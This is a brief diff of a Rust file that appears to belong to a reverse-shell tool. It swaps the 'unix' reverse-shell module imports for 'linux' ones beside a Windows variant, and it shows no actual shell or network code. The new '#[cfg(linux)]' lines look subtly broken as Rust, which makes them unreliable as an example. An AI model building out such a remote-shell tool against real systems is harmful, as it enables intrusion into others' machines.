@@ -2,10 +2,10 @@
 mod config;
 
 // Load the appropriate operating system's implementation
-#[cfg(unix)]
-mod rco_reverse_shell_unix;
-#[cfg(unix)]
-use rco_reverse_shell_unix::shell;
+#[cfg(linux)]
+mod rco_reverse_shell_linux;
+#[cfg(linux)]
+use rco_reverse_shell_linux::shell;
 
 #[cfg(windows)]
 mod rco_reverse_shell_windows;
